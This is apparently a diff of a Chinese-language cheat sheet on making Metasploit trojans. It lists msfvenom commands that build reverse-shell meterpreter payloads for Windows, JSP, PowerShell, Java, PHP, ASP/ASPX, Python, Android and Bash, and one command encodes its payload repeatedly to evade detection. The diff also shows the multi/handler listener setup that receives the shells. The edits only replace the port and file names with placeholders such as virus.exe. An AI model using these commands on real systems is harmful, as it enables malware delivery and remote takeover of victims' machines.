@@ -1,7 +1,7 @@
 msf木马制作
 
 1、在攻击者终端操作：
-msfvenom -p windows/meterpreter/reverse_tcp lhost=kaliIP lport=5555 -f exe >/root/Desktop/evilshell.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=kaliIP lport=<Your Port> -f exe >/root/Desktop/evilshell.exe
 -p 参数后跟上payload（攻击载荷）
 lhost  后跟监听的IP
 lport  后跟监听的端口
@@ -10,34 +10,34 @@ lport  后跟监听的端口
 -i  混淆次数
 -e  混淆模式
 例如：exe木马：
-      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your IP> lport=<Your Port> -f exe -o /root/virus.exe -e x86/shikata_ga_nai -i 8
+      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your IP> lport=<Your Port> -f exe -o virus.exe -e x86/shikata_ga_nai -i 8
 	  
       jsp木马：
-	  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > test.jsp
+	  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > virus.jsp
 	  
 	  #Powershell木马:
-      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f psh-reflection > psl.psl
+      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f psh-reflection > virus.psl
  
       #JAVA木马:
-      msfvenom -p java/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f jar -o hello.jar
+      msfvenom -p java/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f jar -o virus.jar
       
       #PHP木马:
-      msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw -o hello.php
+      msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw -o virus.php
       
       #ASP木马:
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f asp > hello.asp
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f asp > virus.asp
       
       #ASPX木马:
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx > hello.aspx
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx > virus.aspx
       
       #Python木马:
-      msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f  raw > hello.py
+      msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f  raw > virus.py
       
       #Android木马:
-      msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -o hello.apk
+      msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -o virus.apk
       
       #Bash木马:
-      msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP> LPORT=<Your Port> -f raw > hello.sh
+      msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP> LPORT=<Your Port> -f raw > virus.sh
 
 
 2、开启postgresql数据库：（简单攻击可省略）
@@ -53,5 +53,5 @@ msf5>use exploit/multi/handler 选择exploits
 msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  设置payload，注意与上方payload相同
 show options  查看所需设置的参数
 set lhost KaliIP (设置监听地址，注意与上方lhost相同)
-set lport 5555  设置监听端口
+set lport <Your Port>  设置监听端口
 run 或者exploit  运行攻击模块
